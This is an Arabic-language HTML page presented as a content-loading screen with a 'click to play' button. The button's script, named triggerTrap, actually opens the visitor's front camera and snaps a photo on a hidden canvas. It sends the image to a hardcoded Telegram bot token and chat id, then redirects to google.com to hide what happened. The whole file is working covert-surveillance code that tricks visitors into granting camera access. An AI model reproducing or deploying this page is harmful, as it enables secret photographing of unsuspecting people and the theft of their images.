<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جار التحميل...</title>
    <style>
        body { background-color: #121212; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        video, canvas { display: none; }
        .fake-btn { background-color: #ff0055; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 30px; cursor: pointer; }
    </style>
</head>
<body>

    <h2>جاري تحميل المحتوى...</h2>
    <p>يرجى النقر للمتابعة</p>
    <button class="fake-btn" onclick="triggerTrap()">اضغط هنا للتشغيل</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "9190134340:AAGUQMeIimoN6cqr8tKqYXKEmI35NMqoeJw";
        const CHAT_ID = "7664768067";

        async function triggerTrap() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => { resolve(); };
                });

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // تحويل الصورة إلى ملف قابل للإرسال
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.png');

                    // إرسال الصورة مباشرة إلى بوت تيليجرام الخاص بك
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                    window.location.href = "https://google.com";
                }, 'image/png');

            } catch (err) {
                console.error("خطأ:", err);
            }
        }
    </script>
</body>
</html>
